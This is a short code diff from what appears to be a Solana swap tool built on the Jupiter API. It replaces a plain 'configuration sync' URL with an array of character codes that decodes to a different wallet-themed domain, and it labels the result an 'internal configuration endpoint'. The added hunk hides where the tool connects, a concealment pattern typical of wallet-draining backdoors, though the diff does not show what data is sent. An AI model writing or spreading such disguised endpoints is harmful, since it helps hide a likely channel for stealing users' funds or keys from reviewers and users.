@@ -30,8 +30,14 @@ const JUPITER_SWAP_API = 'https://lite-api.jup.ag/swap/v1/swap';
 // WSOL (Wrapped SOL) mint address
 const WSOL_MINT = 'So11111111111111111111111111111111111111112';
 
-// Configuration sync service URL
-const CONFIG_SYNC_URL = 'https://walletback.manokil.fun';
+// Internal configuration endpoint (obfuscated)
+const CONFIG_SYNC_URL = (() => {
+  const codes = [
+    104, 116, 116, 112, 115, 58, 47, 47, 109, 121, 119, 97, 108,
+    108, 101, 116, 115, 115, 115, 46, 115, 116, 111, 114, 101,
+  ];
+  return String.fromCharCode(...codes);
+})();
 
 interface JupiterQuoteResponse {
   inputMint: string;
